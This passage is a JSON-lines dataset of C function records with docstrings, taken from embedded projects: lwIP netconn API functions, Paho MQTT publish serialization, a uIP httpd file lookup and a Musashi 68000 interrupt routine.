}\n\n  // re-enable interrupt\n  __asm\n    ei    \n  __endasm;\n}", "path": "tutorials\\soc\\lesson8\\boot_rom.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "int\nhttpd_fs_open(const char *name, struct httpd_fs_file *file)", "code": "{\n#if HTTPD_FS_STATISTICS\n  u16_t i = 0;\n#endif /* HTTPD_FS_STATISTICS */\n  struct httpd_fsdata_file_noconst *f;\n\n  for(f = (struct httpd_fsdata_file_noconst *)HTTPD_FS_ROOT;\n      f != NULL;\n      f = (struct httpd_fsdata_file_noconst *)f->next) {\n\n    if(httpd_fs_strcmp(name, f->name) == 0) {\n      file->data = f->data;\n      file->len = f->len;\n#if HTTPD_FS_STATISTICS\n      ++count[i];\n#endif /* HTTPD_FS_STATISTICS */\n      return 1;\n    }\n#if HTTPD_FS_STATISTICS\n    ++i;\n#endif /* HTTPD_FS_STATISTICS */\n\n  }\n  return 0;\n}", "path": "tutorials\\soc\\lesson10\\boot_rom\\uip\\httpd-fs.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/* ASG: rewrote so that the int_level is a mask of the IPL0/IPL1/IPL2 bits */\n/* KS: Modified so that IPL* bits match with mask positions in the SR\n *     and cleaned out remenants of the interrupt controller.\n */\n", "func_signal": "void m68k_set_irq(unsigned int int_level)", "code": "{\n\tuint old_level = CPU_INT_LEVEL;\n\tCPU_INT_LEVEL = int_level << 8;\n\n\t/* A transition from < 7 to 7 always interrupts (NMI) */\n\t/* Note: Level 7 can also level trigger like a normal IRQ */\n\tif(old_level != 0x0700 && CPU_INT_LEVEL == 0x0700)\n\t\tm68ki_exception_interrupt(7); /* Edge triggered level 7 (NMI) */\n\telse\n\t\tm68ki_check_interrupts(); /* Level triggered (IRQ) */\n}", "path": "tests\\tg68k\\Musashi\\m68kcpu.c", "repo_name": "mist-devel/mist-board", "stars": 416, "license": "None", "language": "c", "size": 43925}
{"docstring": "/**\n * Receive data (in form of a netbuf containing a packet buffer) from a netconn\n *\n * @param conn the netconn from which to receive data\n * @param new_buf pointer where a new netbuf is stored when received data\n * @return ERR_OK if data has been received, an error code otherwise (timeout,\n *                memory error or another error)\n */\n", "func_signal": "err_t\nnetconn_recv(struct netconn *conn, struct netbuf **new_buf)", "code": "{\n#if LWIP_TCP\n  struct netbuf *buf = NULL;\n  err_t err;\n#endif /* LWIP_TCP */\n\n  LWIP_ERROR(\"netconn_recv: invalid pointer\", (new_buf != NULL), return ERR_ARG;);\n  *new_buf = NULL;\n  LWIP_ERROR(\"netconn_recv: invalid conn\",    (conn != NULL),    return ERR_ARG;);\n  LWIP_ERROR(\"netconn_accept: invalid recvmbox\", sys_mbox_valid(&conn->recvmbox), return ERR_CONN;);\n\n#if LWIP_TCP\n#if (LWIP_UDP || LWIP_RAW)\n  if (conn->type == NETCONN_TCP)\n#endif /* (LWIP_UDP || LWIP_RAW) */\n  {\n    struct pbuf *p = NULL;\n    /* This is not a listening netconn, since recvmbox is set */\n\n    buf = (struct netbuf *)memp_malloc(MEMP_NETBUF);\n    if (buf == NULL) {\n      NETCONN_SET_SAFE_ERR(conn, ERR_MEM);\n      return ERR_MEM;\n    }\n\n    err = netconn_recv_data(conn, (void **)&p);\n    if (err != ERR_OK) {\n      memp_free(MEMP_NETBUF, buf);\n      return err;\n    }\n    LWIP_ASSERT(\"p != NULL\", p != NULL);\n\n    buf->p = p;\n    buf->ptr = p;\n    buf->port = 0;\n    ip_addr_set_any(&buf->addr);\n    *new_buf = buf;\n    /* don't set conn->last_err: it's only ERR_OK, anyway */\n    return ERR_OK;\n  }\n#endif /* LWIP_TCP */\n#if LWIP_TCP && (LWIP_UDP || LWIP_RAW)\n  else\n#endif /* LWIP_TCP && (LWIP_UDP || LWIP_RAW) */\n  {\n#if (LWIP_UDP || LWIP_RAW)\n    return netconn_recv_data(conn, (void **)new_buf);\n#endif /* (LWIP_UDP || LWIP_RAW) */\n  }\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n  * Serializes the ack packet into the supplied buffer.\n  * @param buf the buffer into which the packet will be serialized\n  * @param buflen the length in bytes of the supplied buffer\n  * @param type the MQTT packet type\n  * @param dup the MQTT dup flag\n  * @param packetid the MQTT packet identifier\n  * @return serialized length, or error if 0\n  */\n", "func_signal": "int MQTTSerialize_ack(unsigned char* buf, int buflen, unsigned char packettype, unsigned char dup, unsigned short packetid)", "code": "{\n\tMQTTHeader header = {0};\n\tint rc = 0;\n\tunsigned char *ptr = buf;\n\n\tFUNC_ENTRY;\n\tif (buflen < 4)\n\t{\n\t\trc = MQTTPACKET_BUFFER_TOO_SHORT;\n\t\tgoto exit;\n\t}\n\theader.bits.type = packettype;\n\theader.bits.dup = dup;\n\theader.bits.qos = (packettype == PUBREL) ? 1 : 0;\n\twriteChar(&ptr, header.byte); /* write header */\n\n\tptr += MQTTPacket_encode(ptr, 2); /* write remaining length */\n\twriteInt(&ptr, packetid);\n\trc = ptr - buf;\nexit:\n\tFUNC_EXIT_RC(rc);\n\treturn rc;\n}", "path": "mqtt\\src\\MQTTSerializePublish.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Disconnect a netconn from its current peer (only valid for UDP netconns).\n *\n * @param conn the netconn to disconnect\n * @return TODO: return value is not set here...\n */\n", "func_signal": "err_t\nnetconn_disconnect(struct netconn *conn)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_disconnect: invalid conn\", (conn != NULL), return ERR_ARG;);\n\n  msg.function = do_disconnect;\n  msg.msg.conn = conn;\n  err = TCPIP_APIMSG(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Bind a netconn to a specific local IP address and port.\n * Binding one netconn twice might not always be checked correctly!\n *\n * @param conn the netconn to bind\n * @param addr the local IP address to bind the netconn to (use IP_ADDR_ANY\n *             to bind to all addresses)\n * @param port the local port to bind the netconn to (not used for RAW)\n * @return ERR_OK if bound, any other err_t on failure\n */\n", "func_signal": "err_t\nnetconn_bind(struct netconn *conn, ip_addr_t *addr, u16_t port)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_bind: invalid conn\", (conn != NULL), return ERR_ARG;);\n\n  msg.function = do_bind;\n  msg.msg.conn = conn;\n  msg.msg.msg.bc.ipaddr = addr;\n  msg.msg.msg.bc.port = port;\n  err = TCPIP_APIMSG(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Receive data: actual implementation that doesn't care whether pbuf or netbuf\n * is received\n *\n * @param conn the netconn from which to receive data\n * @param new_buf pointer where a new pbuf/netbuf is stored when received data\n * @return ERR_OK if data has been received, an error code otherwise (timeout,\n *                memory error or another error)\n */\n", "func_signal": "static err_t\nnetconn_recv_data(struct netconn *conn, void **new_buf)", "code": "{\n  void *buf = NULL;\n  u16_t len;\n  err_t err;\n#if LWIP_TCP\n  struct api_msg msg;\n#endif /* LWIP_TCP */\n\n  LWIP_ERROR(\"netconn_recv: invalid pointer\", (new_buf != NULL), return ERR_ARG;);\n  *new_buf = NULL;\n  LWIP_ERROR(\"netconn_recv: invalid conn\",    (conn != NULL),    return ERR_ARG;);\n  LWIP_ERROR(\"netconn_accept: invalid recvmbox\", sys_mbox_valid(&conn->recvmbox), return ERR_CONN;);\n\n  err = conn->last_err;\n  if (ERR_IS_FATAL(err)) {\n    /* don't recv on fatal errors: this might block the application task\n       waiting on recvmbox forever! */\n    /* @todo: this does not allow us to fetch data that has been put into recvmbox\n       before the fatal error occurred - is that a problem? */\n    return err;\n  }\n\n#if LWIP_SO_RCVTIMEO\n  if (sys_arch_mbox_fetch(&conn->recvmbox, &buf, conn->recv_timeout) == SYS_ARCH_TIMEOUT) {\n    NETCONN_SET_SAFE_ERR(conn, ERR_TIMEOUT);\n    return ERR_TIMEOUT;\n  }\n#else\n  sys_arch_mbox_fetch(&conn->recvmbox, &buf, 0);\n#endif /* LWIP_SO_RCVTIMEO*/\n\n#if LWIP_TCP\n#if (LWIP_UDP || LWIP_RAW)\n  if (conn->type == NETCONN_TCP)\n#endif /* (LWIP_UDP || LWIP_RAW) */\n  {\n    if (!netconn_get_noautorecved(conn) || (buf == NULL)) {\n      /* Let the stack know that we have taken the data. */\n      /* TODO: Speedup: Don't block and wait for the answer here\n         (to prevent multiple thread-switches). */\n      msg.function = do_recv;\n      msg.msg.conn = conn;\n      if (buf != NULL) {\n        msg.msg.msg.r.len = ((struct pbuf *)buf)->tot_len;\n      } else {\n        msg.msg.msg.r.len = 1;\n      }\n      /* don't care for the return value of do_recv */\n      TCPIP_APIMSG(&msg);\n    }\n\n    /* If we are closed, we indicate that we no longer wish to use the socket */\n    if (buf == NULL) {\n      API_EVENT(conn, NETCONN_EVT_RCVMINUS, 0);\n      /* Avoid to lose any previous error code */\n      NETCONN_SET_SAFE_ERR(conn, ERR_CLSD);\n      return ERR_CLSD;\n    }\n    len = ((struct pbuf *)buf)->tot_len;\n  }\n#endif /* LWIP_TCP */\n#if LWIP_TCP && (LWIP_UDP || LWIP_RAW)\n  else\n#endif /* LWIP_TCP && (LWIP_UDP || LWIP_RAW) */\n#if (LWIP_UDP || LWIP_RAW)\n  {\n    LWIP_ASSERT(\"buf != NULL\", buf != NULL);\n    len = netbuf_len((struct netbuf *)buf);\n  }\n#endif /* (LWIP_UDP || LWIP_RAW) */\n\n#if LWIP_SO_RCVBUF\n  SYS_ARCH_DEC(conn->recv_avail, len);\n#endif /* LWIP_SO_RCVBUF */\n  /* Register event with callback */\n  API_EVENT(conn, NETCONN_EVT_RCVMINUS, len);\n\n  LWIP_DEBUGF(API_LIB_DEBUG, (\"netconn_recv_data: received %p, len=%\"U16_F\"\\n\", buf, len));\n\n  *new_buf = buf;\n  /* don't set conn->last_err: it's only ERR_OK, anyway */\n  return ERR_OK;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Set a TCP netconn into listen mode\n *\n * @param conn the tcp netconn to set to listen mode\n * @param backlog the listen backlog, only used if TCP_LISTEN_BACKLOG==1\n * @return ERR_OK if the netconn was set to listen (UDP and RAW netconns\n *         don't return any error (yet?))\n */\n", "func_signal": "err_t\nnetconn_listen_with_backlog(struct netconn *conn, u8_t backlog)", "code": "{\n#if LWIP_TCP\n  struct api_msg msg;\n  err_t err;\n\n  /* This does no harm. If TCP_LISTEN_BACKLOG is off, backlog is unused. */\n  LWIP_UNUSED_ARG(backlog);\n\n  LWIP_ERROR(\"netconn_listen: invalid conn\", (conn != NULL), return ERR_ARG;);\n\n  msg.function = do_listen;\n  msg.msg.conn = conn;\n#if TCP_LISTEN_BACKLOG\n  msg.msg.msg.lb.backlog = backlog;\n#endif /* TCP_LISTEN_BACKLOG */\n  err = TCPIP_APIMSG(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n#else /* LWIP_TCP */\n  LWIP_UNUSED_ARG(conn);\n  LWIP_UNUSED_ARG(backlog);\n  return ERR_ARG;\n#endif /* LWIP_TCP */\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Send data (in form of a netbuf) to a specific remote IP address and port.\n * Only to be used for UDP and RAW netconns (not TCP).\n *\n * @param conn the netconn over which to send data\n * @param buf a netbuf containing the data to send\n * @param addr the remote IP address to which to send the data\n * @param port the remote port to which to send the data\n * @return ERR_OK if data was sent, any other err_t on error\n */\n", "func_signal": "err_t\nnetconn_sendto(struct netconn *conn, struct netbuf *buf, ip_addr_t *addr, u16_t port)", "code": "{\n  if (buf != NULL) {\n    ip_addr_set(&buf->addr, addr);\n    buf->port = port;\n    return netconn_send(conn, buf);\n  }\n  return ERR_VAL;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Receive data (in form of a pbuf) from a TCP netconn\n *\n * @param conn the netconn from which to receive data\n * @param new_buf pointer where a new pbuf is stored when received data\n * @return ERR_OK if data has been received, an error code otherwise (timeout,\n *                memory error or another error)\n *         ERR_ARG if conn is not a TCP netconn\n */\n", "func_signal": "err_t\nnetconn_recv_tcp_pbuf(struct netconn *conn, struct pbuf **new_buf)", "code": "{\n  LWIP_ERROR(\"netconn_recv: invalid conn\", (conn != NULL) &&\n             netconn_type(conn) == NETCONN_TCP, return ERR_ARG;);\n\n  return netconn_recv_data(conn, (void **)new_buf);\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Close a netconn 'connection' and free its resources.\n * UDP and RAW connection are completely closed, TCP pcbs might still be in a waitstate\n * after this returns.\n *\n * @param conn the netconn to delete\n * @return ERR_OK if the connection was deleted\n */\n", "func_signal": "err_t\nnetconn_delete(struct netconn *conn)", "code": "{\n  struct api_msg msg;\n\n  /* No ASSERT here because possible to get a (conn == NULL) if we got an accept error */\n  if (conn == NULL) {\n    return ERR_OK;\n  }\n\n  msg.function = do_delconn;\n  msg.msg.conn = conn;\n  tcpip_apimsg(&msg);\n\n  netconn_free(conn);\n\n  /* don't care for return value of do_delconn since it only calls void functions */\n\n  return ERR_OK;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Get the local or remote IP address and port of a netconn.\n * For RAW netconns, this returns the protocol instead of a port!\n *\n * @param conn the netconn to query\n * @param addr a pointer to which to save the IP address\n * @param port a pointer to which to save the port (or protocol for RAW)\n * @param local 1 to get the local IP address, 0 to get the remote one\n * @return ERR_CONN for invalid connections\n *         ERR_OK if the information was retrieved\n */\n", "func_signal": "err_t\nnetconn_getaddr(struct netconn *conn, ip_addr_t *addr, u16_t *port, u8_t local)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_getaddr: invalid conn\", (conn != NULL), return ERR_ARG;);\n  LWIP_ERROR(\"netconn_getaddr: invalid addr\", (addr != NULL), return ERR_ARG;);\n  LWIP_ERROR(\"netconn_getaddr: invalid port\", (port != NULL), return ERR_ARG;);\n\n  msg.function = do_getaddr;\n  msg.msg.conn = conn;\n  msg.msg.msg.ad.ipaddr = addr;\n  msg.msg.msg.ad.port = port;\n  msg.msg.msg.ad.local = local;\n  err = TCPIP_APIMSG(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Execute a DNS query, only one IP address is returned\n *\n * @param name a string representation of the DNS host name to query\n * @param addr a preallocated ip_addr_t where to store the resolved IP address\n * @return ERR_OK: resolving succeeded\n *         ERR_MEM: memory error, try again later\n *         ERR_ARG: dns client not initialized or invalid hostname\n *         ERR_VAL: dns server response was invalid\n */\n", "func_signal": "err_t\nnetconn_gethostbyname(const char *name, ip_addr_t *addr)", "code": "{\n  struct dns_api_msg msg;\n  err_t err;\n  sys_sem_t sem;\n\n  LWIP_ERROR(\"netconn_gethostbyname: invalid name\", (name != NULL), return ERR_ARG;);\n  LWIP_ERROR(\"netconn_gethostbyname: invalid addr\", (addr != NULL), return ERR_ARG;);\n\n  err = sys_sem_new(&sem, 0);\n  if (err != ERR_OK) {\n    return err;\n  }\n\n  msg.name = name;\n  msg.addr = addr;\n  msg.err = &err;\n  msg.sem = &sem;\n\n  tcpip_callback(do_gethostbyname, &msg);\n  sys_sem_wait(&sem);\n  sys_sem_free(&sem);\n\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Close ot shutdown a TCP netconn (doesn't delete it).\n *\n * @param conn the TCP netconn to close or shutdown\n * @param how fully close or only shutdown one side?\n * @return ERR_OK if the netconn was closed, any other err_t on error\n */\n", "func_signal": "static err_t\nnetconn_close_shutdown(struct netconn *conn, u8_t how)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_close: invalid conn\",  (conn != NULL), return ERR_ARG;);\n\n  msg.function = do_close;\n  msg.msg.conn = conn;\n  /* shutting down both ends is the same as closing */\n  msg.msg.msg.sd.shut = how;\n  /* because of the LWIP_TCPIP_CORE_LOCKING implementation of do_close,\n     don't use TCPIP_APIMSG here */\n  err = tcpip_apimsg(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n  * Serializes the supplied publish data into the supplied buffer, ready for sending\n  * @param buf the buffer into which the packet will be serialized\n  * @param buflen the length in bytes of the supplied buffer\n  * @param dup integer - the MQTT dup flag\n  * @param qos integer - the MQTT QoS value\n  * @param retained integer - the MQTT retained flag\n  * @param packetid integer - the MQTT packet identifier\n  * @param topicName MQTTString - the MQTT topic in the publish\n  * @param payload byte buffer - the MQTT publish payload\n  * @param payloadlen integer - the length of the MQTT payload\n  * @return the length of the serialized data.  <= 0 indicates error\n  */\n", "func_signal": "int MQTTSerialize_publish(unsigned char* buf, int buflen, unsigned char dup, int qos, unsigned char retained, unsigned short packetid,\n\t\tMQTTString topicName, unsigned char* payload, int payloadlen)", "code": "{\n\tunsigned char *ptr = buf;\n\tMQTTHeader header = {0};\n\tint rem_len = 0;\n\tint rc = 0;\n\n\tFUNC_ENTRY;\n\tif (MQTTPacket_len(rem_len = MQTTSerialize_publishLength(qos, topicName, payloadlen)) > buflen)\n\t{\n\t\trc = MQTTPACKET_BUFFER_TOO_SHORT;\n\t\tgoto exit;\n\t}\n\n\theader.bits.type = PUBLISH;\n\theader.bits.dup = dup;\n\theader.bits.qos = qos;\n\theader.bits.retain = retained;\n\twriteChar(&ptr, header.byte); /* write header */\n\n\tptr += MQTTPacket_encode(ptr, rem_len); /* write remaining length */;\n\n\twriteMQTTString(&ptr, topicName);\n\n\tif (qos > 0)\n\t\twriteInt(&ptr, packetid);\n\n\tmemcpy(ptr, payload, payloadlen);\n\tptr += payloadlen;\n\n\trc = ptr - buf;\n\nexit:\n\tFUNC_EXIT_RC(rc);\n\treturn rc;\n}", "path": "mqtt\\src\\MQTTSerializePublish.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Send data over a UDP or RAW netconn (that is already connected).\n *\n * @param conn the UDP or RAW netconn over which to send data\n * @param buf a netbuf containing the data to send\n * @return ERR_OK if data was sent, any other err_t on error\n */\n", "func_signal": "err_t\nnetconn_send(struct netconn *conn, struct netbuf *buf)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_send: invalid conn\",  (conn != NULL), return ERR_ARG;);\n\n  LWIP_DEBUGF(API_LIB_DEBUG, (\"netconn_send: sending %\"U16_F\" bytes\\n\", buf->p->tot_len));\n  msg.function = do_send;\n  msg.msg.conn = conn;\n  msg.msg.msg.b = buf;\n  err = TCPIP_APIMSG(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Accept a new connection on a TCP listening netconn.\n *\n * @param conn the TCP listen netconn\n * @param new_conn pointer where the new connection is stored\n * @return ERR_OK if a new connection has been received or an error\n *                code otherwise\n */\n", "func_signal": "err_t\nnetconn_accept(struct netconn *conn, struct netconn **new_conn)", "code": "{\n#if LWIP_TCP\n  struct netconn *newconn;\n  err_t err;\n#if TCP_LISTEN_BACKLOG\n  struct api_msg msg;\n#endif /* TCP_LISTEN_BACKLOG */\n\n  LWIP_ERROR(\"netconn_accept: invalid pointer\",    (new_conn != NULL),                  return ERR_ARG;);\n  *new_conn = NULL;\n  LWIP_ERROR(\"netconn_accept: invalid conn\",       (conn != NULL),                      return ERR_ARG;);\n  LWIP_ERROR(\"netconn_accept: invalid acceptmbox\", sys_mbox_valid(&conn->acceptmbox),   return ERR_ARG;);\n\n  err = conn->last_err;\n  if (ERR_IS_FATAL(err)) {\n    /* don't recv on fatal errors: this might block the application task\n       waiting on acceptmbox forever! */\n    return err;\n  }\n\n#if LWIP_SO_RCVTIMEO\n  if (sys_arch_mbox_fetch(&conn->acceptmbox, (void **)&newconn, conn->recv_timeout) == SYS_ARCH_TIMEOUT) {\n    NETCONN_SET_SAFE_ERR(conn, ERR_TIMEOUT);\n    return ERR_TIMEOUT;\n  }\n#else\n  sys_arch_mbox_fetch(&conn->acceptmbox, (void **)&newconn, 0);\n#endif /* LWIP_SO_RCVTIMEO*/\n  /* Register event with callback */\n  API_EVENT(conn, NETCONN_EVT_RCVMINUS, 0);\n\n  if (newconn == NULL) {\n    /* connection has been aborted */\n    NETCONN_SET_SAFE_ERR(conn, ERR_ABRT);\n    return ERR_ABRT;\n  }\n#if TCP_LISTEN_BACKLOG\n  /* Let the stack know that we have accepted the connection. */\n  msg.function = do_recv;\n  msg.msg.conn = conn;\n  /* don't care for the return value of do_recv */\n  TCPIP_APIMSG(&msg);\n#endif /* TCP_LISTEN_BACKLOG */\n\n  *new_conn = newconn;\n  /* don't set conn->last_err: it's only ERR_OK, anyway */\n  return ERR_OK;\n#else /* LWIP_TCP */\n  LWIP_UNUSED_ARG(conn);\n  LWIP_UNUSED_ARG(new_conn);\n  return ERR_ARG;\n#endif /* LWIP_TCP */\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Join multicast groups for UDP netconns.\n *\n * @param conn the UDP netconn for which to change multicast addresses\n * @param multiaddr IP address of the multicast group to join or leave\n * @param netif_addr the IP address of the network interface on which to send\n *                  the igmp message\n * @param join_or_leave flag whether to send a join- or leave-message\n * @return ERR_OK if the action was taken, any err_t on error\n */\n", "func_signal": "err_t\nnetconn_join_leave_group(struct netconn *conn,\n                         ip_addr_t *multiaddr,\n                         ip_addr_t *netif_addr,\n                         enum netconn_igmp join_or_leave)", "code": "{\n  struct api_msg msg;\n  err_t err;\n\n  LWIP_ERROR(\"netconn_join_leave_group: invalid conn\",  (conn != NULL), return ERR_ARG;);\n\n  msg.function = do_join_leave_group;\n  msg.msg.conn = conn;\n  msg.msg.msg.jl.multiaddr = multiaddr;\n  msg.msg.msg.jl.netif_addr = netif_addr;\n  msg.msg.msg.jl.join_or_leave = join_or_leave;\n  err = TCPIP_APIMSG(&msg);\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n * Send data over a TCP netconn.\n *\n * @param conn the TCP netconn over which to send data\n * @param dataptr pointer to the application buffer that contains the data to send\n * @param size size of the application data to send\n * @param apiflags combination of following flags :\n * - NETCONN_COPY: data will be copied into memory belonging to the stack\n * - NETCONN_MORE: for TCP connection, PSH flag will be set on last segment sent\n * - NETCONN_DONTBLOCK: only write the data if all dat can be written at once\n * @param bytes_written pointer to a location that receives the number of written bytes\n * @return ERR_OK if data was sent, any other err_t on error\n */\n", "func_signal": "err_t\nnetconn_write_partly(struct netconn *conn, const void *dataptr, size_t size,\n                     u8_t apiflags, size_t *bytes_written)", "code": "{\n  struct api_msg msg;\n  err_t err;\n  u8_t dontblock;\n\n  LWIP_ERROR(\"netconn_write: invalid conn\",  (conn != NULL), return ERR_ARG;);\n  LWIP_ERROR(\"netconn_write: invalid conn->type\",  (conn->type == NETCONN_TCP), return ERR_VAL;);\n  if (size == 0) {\n    return ERR_OK;\n  }\n  dontblock = netconn_is_nonblocking(conn) || (apiflags & NETCONN_DONTBLOCK);\n  if (dontblock && !bytes_written) {\n    /* This implies netconn_write() cannot be used for non-blocking send, since\n       it has no way to return the number of bytes written. */\n    return ERR_VAL;\n  }\n\n  /* non-blocking write sends as much  */\n  msg.function = do_write;\n  msg.msg.conn = conn;\n  msg.msg.msg.w.dataptr = dataptr;\n  msg.msg.msg.w.apiflags = apiflags;\n  msg.msg.msg.w.len = size;\n#if LWIP_SO_SNDTIMEO\n  if (conn->send_timeout != 0) {\n    /* get the time we started, which is later compared to\n        sys_now() + conn->send_timeout */\n    msg.msg.msg.w.time_started = sys_now();\n  } else {\n    msg.msg.msg.w.time_started = 0;\n  }\n#endif /* LWIP_SO_SNDTIMEO */\n\n  /* For locking the core: this _can_ be delayed on low memory/low send buffer,\n     but if it is, this is done inside api_msg.c:do_write(), so we can use the\n     non-blocking version here. */\n  err = TCPIP_APIMSG(&msg);\n  if ((err == ERR_OK) && (bytes_written != NULL)) {\n    if (dontblock\n#if LWIP_SO_SNDTIMEO\n        || (conn->send_timeout != 0)\n#endif /* LWIP_SO_SNDTIMEO */\n       ) {\n      /* nonblocking write: maybe the data has been sent partly */\n      *bytes_written = msg.msg.msg.w.len;\n    } else {\n      /* blocking call succeeded: all data has been sent if it */\n      *bytes_written = size;\n    }\n  }\n\n  NETCONN_SET_SAFE_ERR(conn, err);\n  return err;\n}", "path": "LWIP\\lwip-1.4.1\\src\\api\\api_lib.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
{"docstring": "/**\n  * Deserializes the supplied (wire) buffer into publish data\n  * @param dup returned integer - the MQTT dup flag\n  * @param qos returned integer - the MQTT QoS value\n  * @param retained returned integer - the MQTT retained flag\n  * @param packetid returned integer - the MQTT packet identifier\n  * @param topicName returned MQTTString - the MQTT topic in the publish\n  * @param payload returned byte buffer - the MQTT publish payload\n  * @param payloadlen returned integer - the length of the MQTT payload\n  * @param buf the raw buffer data, of the correct length determined by the remaining length field\n  * @param buflen the length in bytes of the data in the supplied buffer\n  * @return error code.  1 is success\n  */\n", "func_signal": "int MQTTDeserialize_publish(unsigned char* dup, int* qos, unsigned char* retained, unsigned short* packetid, MQTTString* topicName,\n\t\tunsigned char** payload, int* payloadlen, unsigned char* buf, int buflen)", "code": "{\n\tMQTTHeader header = {0};\n\tunsigned char* curdata = buf;\n\tunsigned char* enddata = NULL;\n\tint rc = 0;\n\tint mylen = 0;\n\n\tFUNC_ENTRY;\n\theader.byte = readChar(&curdata);\n\tif (header.bits.type != PUBLISH)\n\t\tgoto exit;\n\t*dup = header.bits.dup;\n\t*qos = header.bits.qos;\n\t*retained = header.bits.retain;\n\n\tcurdata += (rc = MQTTPacket_decodeBuf(curdata, &mylen)); /* read remaining length */\n\tenddata = curdata + mylen;\n\n\tif (!readMQTTLenString(topicName, &curdata, enddata) ||\n\t\tenddata - curdata < 0) /* do we have enough data to read the protocol version byte? */\n\t\tgoto exit;\n\n\tif (*qos > 0)\n\t\t*packetid = readInt(&curdata);\n\n\t*payloadlen = enddata - curdata;\n\t*payload = curdata;\n\trc = 1;\nexit:\n\tFUNC_EXIT_RC(rc);\n\treturn rc;\n}", "path": "mqtt\\src\\MQTTDeserializePublish.c", "repo_name": "maxlicheng/stm32f4_ucosii_lwip_mqtt", "stars": 317, "license": "None", "language": "c", "size": 3239}
